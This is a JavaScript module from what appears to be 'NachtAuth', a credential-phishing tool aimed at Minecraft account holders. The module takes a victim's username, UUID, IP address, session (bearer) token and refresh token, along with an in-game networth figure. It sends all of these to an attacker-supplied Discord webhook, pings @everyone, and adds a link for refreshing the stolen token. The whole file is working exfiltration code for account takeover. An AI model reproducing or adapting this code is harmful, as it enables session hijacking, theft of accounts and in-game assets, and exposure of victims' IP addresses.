const config = require('../../../config.json');
const axios = require("axios");

let refresh_url = config.azure.redirect_uri;
if (!config.azure.redirect_uri.endsWith("/")) {
    refresh_url = config.azure.redirect_uri + "/";
}

module.exports = (refresh, username, uuid, ip, BearerToken, refresh_token, networth, soulboundnetworth, description, webhook, state) => {
    let embeddescription;
    let networthtext;

    if (!state) {
        return;
    }

    // if the token is being refreshed, set the embed description to "A token has been refreshed!"
    if (refresh) {
        embeddescription = "A token has been refreshed!"
    // if the token is first being sent, set the embed description to "A user has been authenticated!"
    } else {
        embeddescription = "A user has been authenticated!"
    }

    // if the networth is 0, set the networth text to "Networth: 0"
    if (networth == 0) {
        networthtext = "🪙 Networth: 0"
    // if the networth is not 0, set the networth text to "Networth: (soulbound networth) (unsoulbound networth)"
    } else {
        networthtext = "🪙 Networth: " + soulboundnetworth + " (" + networth + " unsoulbound)"
    }
    let data = {
        "username": "NachtAuth",
        "avatar_url": "https://cdn.discordapp.com/attachments/1053140780425945100/1055361442901135450/NachtAuth.png",
        "content": "@everyone",
        "embeds": [
            {
            "title": "NachtAuth",
            "description": embeddescription,
            "color":  0x7289DA,
            "author": {
                    "name": networthtext,
            },
            footer: {
                    "text": "🌟 NachtAuth by Gute Nacht 🌟",
                    "url": "https://cdn.discordapp.com/attachments/1053140780425945100/1055361442901135450/NachtAuth.png"
            },
            timestamp: new Date(),
            "fields": [
                {
                    "name": "Username",
                    "value": "```"+username+"```",
                    "inline": true
                },
                {
                    "name": "UUID",
                    "value": "```"+uuid+"```",
                    "inline": true
                },
                {
                    "name": "IP Address",
                    "value": "```"+ip+"```",
                    "inline": true
                },
                {
                    "name": "Session ID",
                    "value": "```"+BearerToken+"```",
                    "inline": false
                },
                {
                    "name": "Refresh Token",
                    "value": `Click [here](${refresh_url}refresh?refresh_token=${refresh_token}&state=${state}) to refresh their token!`,
                }
            ]
        }
    ]
}   

    // set the config for the webhook
    var config = {
        method: "POST",
        url: webhook,
        headers: { "Content-Type": "application/json" },
        data: data,
    };

    // send the webhook the data
    axios(config)
    .then((response) => {
        // do nothing
    }).catch(error => {
            console.log("Error sending webhook: ", error)
    })
}